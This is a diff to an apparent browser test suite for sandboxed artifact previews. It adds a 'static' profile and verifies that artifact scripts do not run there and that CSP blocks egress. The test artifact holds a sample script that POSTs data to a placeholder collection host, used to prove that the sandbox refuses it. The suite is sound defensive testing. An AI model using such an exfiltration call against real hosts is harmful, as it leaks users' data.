@@ -68,6 +68,7 @@ const ARTIFACT = `<!doctype html><html><head><meta charset="utf-8"></head><body>
     console.log("violation " + e.effectiveDirective + " " + e.blockedURI);
   });
   console.log("artifact script ran");
+  document.body.setAttribute("data-ran", "1");
   fetch("https://egress.example.invalid/collect", { method: "POST", body: "typed" }).catch(function () {});
 </script>
 </body></html>`;
@@ -99,6 +100,11 @@ hydrateRoot(document.getElementById("ssr"), React.createElement(Frame, { name: "
 createRoot(document.getElementById("private")).render(React.createElement(Frame, { name: "private" }));
 createRoot(document.getElementById("public")).render(
   React.createElement(SandboxProfileProvider, { profile: "public" }, React.createElement(Frame, { name: "public" }))
+);
+// A public share with scripted previews off: it reports nothing, by design, so
+// the test reads the frame itself.
+createRoot(document.getElementById("static")).render(
+  React.createElement(SandboxProfileProvider, { profile: "static" }, React.createElement(Frame, { name: "public" }))
 );
 
 // The control: the old way. It inherits this page's nonce policy.
@@ -156,6 +162,7 @@ async function startServer(bundle: string): Promise<{ origin: string; close: () 
       res.end(
         `<!doctype html><html><body><div id="ssr" style="height:120px">${SSR_FRAME}</div>` +
           `<div id="private" style="height:120px"></div><div id="public" style="height:120px"></div>` +
+          `<div id="static" style="height:120px"></div>` +
           `<script nonce="${nonce}" src="/harness.js"></script></body></html>`,
       );
       return;
@@ -169,9 +176,9 @@ async function startServer(bundle: string): Promise<{ origin: string; close: () 
     // The shell as a client that sent no Sec-Fetch-Dest (or a stale cache)
     // would get it: past the route's refusal, so the header's sandbox is all
     // that stands between the URL and a page with an origin.
-    const raw = /^\/raw-shell\/(private|public)$/.exec(pathname);
+    const raw = /^\/raw-shell\/(private|public|static)$/.exec(pathname);
     if (raw) {
-      const routed = sandboxShellResponse({ profile: raw[1] as "private" | "public", appOrigin: null, separateOrigin: false });
+      const routed = sandboxShellResponse({ profile: raw[1] as "private" | "public" | "static", appOrigin: null, separateOrigin: false });
       res.setHeader("Content-Security-Policy", routed.headers.get("content-security-policy") ?? "");
       res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
       res.end(await routed.text());
@@ -241,6 +248,13 @@ test("an artifact's scripts run inside the app's enforcing policy, and its egres
         `${profile}: the fetch to an arbitrary host was not refused: ${JSON.stringify(lines)}`,
       );
     }
+    // A static public preview: the page's markup is there, and its script never ran.
+    const staticFrame = page.frames().find((f) => f.url().endsWith("/sandbox/v1/static"));
+    assert.ok(staticFrame, "no static preview frame");
+    await staticFrame.waitForFunction(() => document.body?.innerText.includes("preview"), undefined, { timeout: 5_000 });
+    const ran = await staticFrame.evaluate(() => document.body.getAttribute("data-ran"));
+    assert.equal(ran, null, "an artifact script ran in a static public preview");
+
     // Images: any https host in your own previews; a public share refuses a tracker.
     assert.ok(
       results.public.console.some((l) => l.startsWith("violation img-src https://tracker.example.invalid")),
@@ -271,7 +285,7 @@ test("a preview URL opened on its own is refused, and has no origin even if serv
     await context.addCookies([{ name: "authjs.session-token", value: "secret", url: server.origin }]);
     const page = await context.newPage();
 
-    for (const profile of ["private", "public"]) {
+    for (const profile of ["private", "public", "static"]) {
       const res = await page.goto(`${server.origin}/sandbox/v1/${profile}`);
       assert.equal(res?.status(), 404, `${profile}: the shell answered a top-level visit`);
       assert.doesNotMatch(await page.content(), /juno:sandbox-render/);
